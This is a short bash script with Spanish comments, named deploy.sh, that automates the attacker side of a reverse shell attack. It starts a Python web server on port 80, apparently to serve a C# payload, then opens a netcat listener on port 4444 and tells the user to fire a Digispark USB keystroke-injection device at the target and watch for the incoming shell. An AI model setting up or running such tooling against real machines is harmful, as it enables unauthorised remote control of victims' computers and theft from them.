#!/bin/bash
# deploy.sh - Configura todo automáticamente

IP="TU_IP"
PORT="4444"

echo "[*] Configurando reverse shell C#..."

echo "[*] Iniciando servidor web en puerto 80..."
python3 -m http.server 80 &
WEB_PID=$!

echo "[*] Iniciando listener en puerto $PORT..."
echo "[*] Ejecuta el Digispark y observa aquí..."
nc -lvnp $PORT

# Limpiar al salir
kill $WEB_PID 2>/dev/null
